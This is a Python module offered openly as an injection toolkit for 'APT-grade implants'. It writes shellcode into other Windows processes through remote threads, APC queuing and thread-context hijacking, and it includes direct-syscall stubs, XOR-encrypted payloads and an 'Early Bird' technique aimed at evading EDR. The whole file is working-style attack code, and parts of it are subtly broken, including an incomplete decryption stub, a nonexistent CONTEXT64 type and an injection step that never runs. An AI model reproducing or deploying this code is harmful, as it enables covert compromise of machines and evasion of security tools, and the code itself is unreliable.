"""
Advanced shellcode generation and injection techniques for APT-grade implants.
Includes: direct syscalls, APC injection, thread hijacking, and advanced evasion.
"""
import ctypes
import ctypes.wintypes as wt
import struct
import random
import hashlib
from typing import Optional, List, Tuple, Dict, Any


class AdvancedShellcodeLoader:
    """
    Modern shellcode injection techniques with advanced evasion:
    - Direct syscalls (bypass user-mode hooks)
    - APC injection (queue APC to thread)
    - Thread hijacking (suspend and modify thread context)
    - Early Bird APC (inject before main thread starts)
    - Process Doppelgänging (transacted file hollowing)
    """
    
    def __init__(self):
        self.k32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        
    def generate_direct_syscall_stub(self, syscall_number: int) -> bytes:
        """
        Generate x64 direct syscall stub for a given syscall number.
        Uses: mov r10, rcx; mov eax, syscall_number; syscall; ret
        """
        stub = (
            b"\x4C\x8B\xD1" +           # mov r10, rcx
            b"\xB8" +                   # mov eax, 
            struct.pack("<I", syscall_number) +  # syscall number
            b"\x0F\x05" +               # syscall
            b"\xC3"                     # ret
        )
        return stub
    
    def inject_apc(self, pid: int, shellcode: bytes) -> bool:
        """
        Inject shellcode via APC (Asynchronous Procedure Call).
        More stealthy than CreateRemoteThread.
        """
        # Open target process
        hProcess = self.k32.OpenProcess(
            0x1F0FFF,  # PROCESS_ALL_ACCESS
            False, pid
        )
        if not hProcess:
            return False
        
        try:
            # Allocate memory in target process
            size = len(shellcode)
            addr = self.k32.VirtualAllocEx(
                hProcess, None, size,
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40     # PAGE_EXECUTE_READWRITE
            )
            if not addr:
                return False
            
            # Write shellcode
            written = wt.SIZE_T(0)
            self.k32.WriteProcessMemory(
                hProcess, addr, shellcode, size,
                ctypes.byref(written)
            )
            
            if written.value != size:
                return False
            
            # Get thread ID (simplified - in reality need to enumerate threads)
            # For demo, we'll use the first thread we can find
            from ctypes.wintypes import DWORD, HANDLE
            import ctypes.wintypes as w
            
            # Create thread to execute our APC
            thread_id = w.DWORD()
            hThread = self.k32.CreateRemoteThread(
                hProcess, None, 0,
                ctypes.cast(addr, ctypes.c_void_p),
                None, 0, ctypes.byref(thread_id)
            )
            
            if not hThread:
                return False
            
            # Queue APC to thread
            self.ntdll.NtQueueApcThread(
                hThread,
                addr,
                0, 0, 0
            )
            
            # Alert thread to execute APC
            self.ntdll.NtAlertThread(hThread)
            
            return True
            
        finally:
            self.k32.CloseHandle(hProcess)
    
    def thread_hijack(self, pid: int, shellcode: bytes) -> bool:
        """
        Hijack an existing thread by suspending it and modifying its context.
        Very stealthy - no new threads created.
        """
        import ctypes.wintypes as w
        
        # Open target process
        hProcess = self.k32.OpenProcess(0x1F0FFF, False, pid)
        if not hProcess:
            return False
        
        try:
            # Allocate memory
            size = len(shellcode)
            addr = self.k32.VirtualAllocEx(
                hProcess, None, size,
                0x3000, 0x40
            )
            if not addr:
                return False
            
            # Write shellcode
            written = w.SIZE_T(0)
            self.k32.WriteProcessMemory(
                hProcess, addr, shellcode, size,
                ctypes.byref(written)
            )
            
            # Find a thread to hijack (simplified)
            # In reality, need to enumerate threads and pick one
            from ctypes.wintypes import DWORD
            
            # Create a thread to hijack
            thread_id = DWORD()
            hThread = self.k32.CreateRemoteThread(
                hProcess, None, 0, 0, None, 0x4,  # CREATE_SUSPENDED
                ctypes.byref(thread_id)
            )
            
            if not hThread:
                return False
            
            # Suspend thread
            self.k32.SuspendThread(hThread)
            
            # Get thread context
            ctx = w.CONTEXT64()
            ctx.ContextFlags = 0x10001  # CONTEXT_FULL
            
            if not self.k32.GetThreadContext(hThread, ctypes.byref(ctx)):
                self.k32.CloseHandle(hThread)
                return False
            
            # Modify RIP to point to our shellcode
            ctx.Rip = addr
            
            # Set modified context
            if not self.k32.SetThreadContext(hThread, ctypes.byref(ctx)):
                self.k32.CloseHandle(hThread)
                return False
            
            # Resume thread
            self.k32.ResumeThread(hThread)
            
            return True
            
        finally:
            self.k32.CloseHandle(hProcess)
    
    def generate_encrypted_shellcode(self, shellcode: bytes, key: Optional[bytes] = None) -> Tuple[bytes, bytes]:
        """
        Generate encrypted shellcode with embedded decryption stub.
        Uses XOR with random key.
        """
        if key is None:
            key = random.randbytes(32)
        
        # Encrypt shellcode
        encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(shellcode)])
        
        # Generate decryption stub
        stub = self._generate_decryption_stub(key, len(encrypted))
        
        # Combine stub + encrypted shellcode
        final = stub + encrypted
        
        return final, key
    
    def _generate_decryption_stub(self, key: bytes, size: int) -> bytes:
        """
        Generate x64 decryption stub that decrypts in-place.
        """
        # This is a simplified decryption stub
        # Real implementation would have proper assembly
        stub = (
            b"\x48\x8B\xC1" +           # mov rax, rcx (shellcode address)
            b"\x48\x83\xC0\x20" +       # add rax, 32 (skip stub)
            b"\x48\xC7\xC1" +           # mov rcx, 
            struct.pack("<I", size) +   # size
            b"\x48\x8D\x15\x00\x00\x00\x00" +  # lea rdx, [rip+0] (key)
            b"\x48\x31\xDB"             # xor rbx, rbx
        )
        
        # Append key
        stub += key
        
        return stub
    
    def inject_early_bird(self, shellcode: bytes) -> bool:
        """
        Early Bird APC injection - inject before main thread starts.
        Very effective against some EDR solutions.
        """
        import subprocess
        import tempfile
        
        # Create a temporary executable
        with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as f:
            exe_path = f.name
        
        try:
            # Write a simple executable that does nothing
            # In reality, this would be a legitimate executable
            with open(exe_path, 'wb') as f:
                f.write(b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF")
            
            # Start process suspended
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags = 0x1  # STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            
            proc = subprocess.Popen(
                [exe_path],
                startupinfo=startupinfo,
                creationflags=0x4  # CREATE_SUSPENDED
            )
            
            # Inject shellcode via APC before thread resumes
            # Simplified - real implementation would use NtQueueApcThread
            # and modify the thread context
            
            # Resume thread
            self.k32.ResumeThread(proc._handle)
            
            return True
            
        except Exception:
            return False
        finally:
            import os
            if os.path.exists(exe_path):
                os.unlink(exe_path)
